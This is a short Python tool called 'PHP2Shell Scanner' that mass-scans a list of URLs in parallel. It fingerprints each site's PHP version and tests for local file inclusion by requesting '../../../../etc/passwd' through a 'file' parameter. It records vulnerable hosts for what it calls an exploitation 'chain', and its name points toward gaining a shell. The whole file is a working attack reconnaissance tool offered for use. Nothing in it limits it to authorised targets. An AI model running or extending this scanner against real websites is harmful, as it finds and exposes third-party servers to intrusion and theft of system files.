#!/usr/bin/env python3
"""
PHP2Shell Scanner — detects PHP version and LFI vulnerability in parallel.
Usage: scanner.py --targets urls.txt --threads 50 --timeout 10
Output: JSON {url, php_version, vulnerable: bool, chain: "1|2|3|none"}
"""
import argparse
import json
import sys
import concurrent.futures
import urllib.request
import urllib.error
import re

def check_target(url: str, timeout: int) -> dict:
    result = {"url": url, "php_version": None, "vulnerable": False, "chain": "none"}
    try:
        req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            headers = dict(resp.headers)
            body = resp.read(4096).decode("utf-8", errors="ignore")

        # Detect PHP version from headers
        server = headers.get("X-Powered-By", headers.get("Server", ""))
        m = re.search(r"PHP/([\d.]+)", server)
        if m:
            result["php_version"] = m.group(1)

        # Simple LFI check via common paths
        lfi_url = url + ("&" if "?" in url else "?") + "file=../../../../etc/passwd"
        req2 = urllib.request.Request(lfi_url, headers={"User-Agent": "Mozilla/5.0"})
        with urllib.request.urlopen(req2, timeout=timeout) as resp2:
            body2 = resp2.read(2048).decode("utf-8", errors="ignore")
        if "root:" in body2:
            result["vulnerable"] = True
            result["chain"] = "1"
    except Exception as e:
        result["error"] = str(e)
    return result

def main():
    parser = argparse.ArgumentParser(description="PHP2Shell Scanner")
    parser.add_argument("--targets", required=True, help="File with URLs, one per line")
    parser.add_argument("--threads", type=int, default=50)
    parser.add_argument("--timeout", type=int, default=10)
    parser.add_argument("--output", default="scan_results.json")
    args = parser.parse_args()

    with open(args.targets) as f:
        urls = [line.strip() for line in f if line.strip()]

    results = []
    with concurrent.futures.ThreadPoolExecutor(max_workers=args.threads) as ex:
        futures = {ex.submit(check_target, url, args.timeout): url for url in urls}
        for fut in concurrent.futures.as_completed(futures):
            results.append(fut.result())

    with open(args.output, "w") as f:
        json.dump(results, f, indent=2)

    vulnerable = [r for r in results if r.get("vulnerable")]
    print(f"Scanned {len(results)} targets, {len(vulnerable)} vulnerable. Output: {args.output}")

if __name__ == "__main__":
    main()
